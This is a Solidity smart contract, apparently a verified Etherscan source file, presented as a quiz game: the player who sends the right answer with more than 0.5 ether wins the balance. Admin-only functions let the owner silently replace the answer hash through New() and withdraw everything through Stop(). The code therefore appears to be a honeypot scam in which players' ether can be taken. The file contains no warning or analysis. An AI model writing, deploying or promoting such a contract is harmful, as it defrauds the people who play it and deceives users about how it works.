/**
 *Submitted for verification at Etherscan.io on 2021-11-21
*/

pragma solidity ^0.8.10;

contract Quiz
{
    function Try(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 0.5 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    address admin;

    function Start(string calldata _question, string calldata _response) public payable isAdmin{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {
        admin=msg.sender;
    }

    modifier isAdmin(){
        require(admin==msg.sender);
        _;
    }

    fallback() external {}
}